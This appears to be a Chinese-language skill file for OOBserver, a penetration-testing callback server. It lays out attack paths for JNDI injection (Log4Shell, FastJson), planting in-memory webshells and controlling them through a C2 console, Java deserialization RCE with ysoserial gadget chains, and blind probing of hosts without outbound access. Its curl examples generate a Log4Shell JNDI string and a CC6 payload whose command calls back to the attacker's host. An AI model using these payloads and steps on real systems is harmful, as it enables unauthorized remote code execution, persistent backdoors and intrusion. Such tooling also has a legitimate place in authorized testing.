---
name: OOBserver
description: 在需要 OOB 外带验证、JNDI 注入利用、内存马投递、Java 反序列化 payload 生成、以及不出网盲打场景时使用；替代 dnslog/ceye，适用于网络隔离内网环境
---

### OOBserver 利用路径

- **[路径一：OOB 存活验证（漏洞确认）]**
    - **[必须满足的前置条件]**：目标存在可能的命令执行/SSRF/JNDI 注入点
    - **攻击路径**：
        1. 申请 OOB Token（intent=record）
        2. 将 HTTP/LDAP 回连 URL 注入目标漏洞点
        3. 查询事件确认目标是否回连

- **[路径二：JNDI 注入 RCE（Log4j/FastJson/SnakeYAML 等）]**
    - **[必须满足的前置条件]**：目标存在 JNDI 注入点，JDK 版本已知
    - **攻击路径**：
        1. 申请 Token（intent=jndi），选择协议 ldap/rmi
        2. 在内存马工坊生成目标类型的内存马字节码
        3. 调用 `/api/rebind/{token}/set` 将字节码注册到 LDAP 服务
        4. 将 `ldap://<IP>:1389/<token>` 注入漏洞点触发加载
        5. 内存马注入成功后在 Agent C2 控制台发送命令

- **[路径三：反序列化 RCE（CC/CB/Shiro 等）]**
    - **[必须满足的前置条件]**：目标存在 Java 反序列化端点，gadget 库已知
    - **攻击路径**：
        1. 通过 Payload Builder 选择对应利用链（CC6/CB1/Spring1/Groovy1 等）
        2. 输入命令，生成序列化字节（Base64）
        3. 将字节提交到目标反序列化端点

- **[路径四：不出网无回显盲打验证]**
    - **[必须满足的前置条件]**：目标无出网 HTTP/DNS，需通过延迟/ICMP/内网 HTTP 判断
    - **攻击路径**：
        1. 选择盲打 Payload 类型（time_sleep/icmp_ping/http_oob/smb_oob）
        2. 生成对应命令，注入漏洞点
        3. 观察延迟/ICMP 流量/OOBserver HTTP 回连

### 相关工具说明

- OOBserver API：`http://<OOB_IP>:8010/api`（Bearer Token 或 X-API-Key 认证）
- Swagger 文档：`http://<OOB_IP>:8010/docs`
- LDAP 监听：`ldap://<OOB_IP>:1389/<token>`（intent=jndi/memshell 时自动返回字节码）
- RMI 监听：`rmi://<OOB_IP>:1099/<token>`
- HTTP 回连：`http://<OOB_IP>:8010/callback/http/<token>`

### 使用示例

```bash
# 1. 登录获取 Token
TOKEN=$(curl -s -X POST http://<OOB_IP>:8010/api/auth/login \
  -d "username=admin&password=<pass>" | python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])")

# 2. 申请 OOB Token（JNDI 模式）
curl -X POST http://<OOB_IP>:8010/api/tokens \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"project_id":1,"protocols":["http","ldap","rmi"],"intent":"jndi","label":"log4j-test"}'

# 3. 生成 Log4Shell payload
curl -X POST http://<OOB_IP>:8010/api/payloads/generate \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"type":"exfil_log4j","params":{"token":"<token>","protocol":"ldap"}}'
# 返回: ${jndi:ldap://<IP>:1389/<token>}

# 4. 生成 CC6 序列化 payload
curl -X POST http://<OOB_IP>:8010/api/payloads/generate \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"type":"ysoserial_cc6","params":{"cmd":"curl http://<OOB_IP>:8010/callback/http/<token>"}}'
# 返回 Base64 序列化字节

# 5. 查询命中
curl http://<OOB_IP>:8010/api/tokens/<token>/events \
  -H "Authorization: Bearer $TOKEN"
```
